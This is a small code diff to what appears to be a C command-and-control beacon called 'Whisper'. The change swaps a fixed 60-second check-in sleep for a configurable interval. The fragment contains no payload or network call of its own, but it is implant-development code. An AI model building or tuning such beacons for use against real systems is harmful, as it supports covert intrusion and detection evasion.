@@ -4,6 +4,7 @@
 #include "whisper_config.h"
 #include "whisper_json.h"
 #include "whisper_winapi.h"
+#include "whisper_dynamic_config.h"
 #include <windows.h>
 #include <stdio.h>
 
@@ -110,7 +111,7 @@ DWORD WINAPI BeaconLoop() {
             DEBUG_LOG("[THREAD] Failed to decode command\n");
         }
 
-        WhisperSleep(60 * 1000);
+        WhisperSleep(get_sleep_time());
     }
 
     DEBUG_LOG("[THREAD] Beacon loop exiting\n");
